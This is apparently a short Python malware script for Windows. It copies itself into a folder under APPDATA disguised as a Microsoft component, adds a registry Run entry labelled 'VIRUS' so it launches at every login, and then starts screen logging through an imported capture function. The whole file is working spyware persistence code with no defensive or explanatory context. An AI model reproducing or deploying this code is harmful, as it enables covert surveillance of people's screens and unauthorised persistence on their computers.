from screen_capture import logScreen 
import os
import winreg as reg
import shutil as sh
import sys

install_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "ScreenLogger")
path_exe = os.path.join(install_dir, "screenlogger.exe")

def installLogger():
    if not os.path.exists(install_dir):
        os.makedirs(install_dir)
        sh.copyfile(sys.executable, path_exe)

        key = reg.HKEY_CURRENT_USER
        sub_key = "Software\Microsoft\Windows\CurrentVersion\Run"

        open = reg.OpenKey(key, sub_key,0,reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open,"VIRUS",0,reg.REG_SZ, path_exe)

if __name__ == "__main__":
    installLogger()
    logScreen()